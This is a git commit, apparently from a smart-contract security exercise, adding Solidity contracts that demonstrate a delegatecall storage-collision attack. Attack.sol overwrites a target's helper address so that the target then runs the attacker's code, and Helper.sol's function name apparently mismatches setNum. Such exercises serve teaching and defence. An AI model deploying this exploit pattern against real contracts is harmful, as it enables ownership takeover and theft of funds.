de587d53d79fa30c4ef6aeec9f6e40b6366236ea
udeshika <perera.n.u@gmail.com>
2024-03-02 08:04:31 +0800

    Initial commit for delegate-call

---
+++ senior/delegate-call/contracts/Attack.sol
@@ -0,0 +1,26 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.24;
+
+import "./Good.sol";
+
+contract Attack {
+    address public helper;
+    address public owner;
+    uint256 public num;
+
+    Good public good;
+
+    constructor(Good _good) {
+        good = _good;
+    }
+
+    function setNum(uint256 _num) public {
+        num = _num;
+    }
+
+    function attack() public {
+        good.setNum(uint256(uint160(address(this))));
+        good.setNum(1);
+    }
+}
---
+++ senior/delegate-call/contracts/Helper.sol
@@ -0,0 +1,10 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.24;
+
+contract Helper {
+    uint public num;
+
+    function setName(uint _num) public {
+        num = _num;
+    }
+}
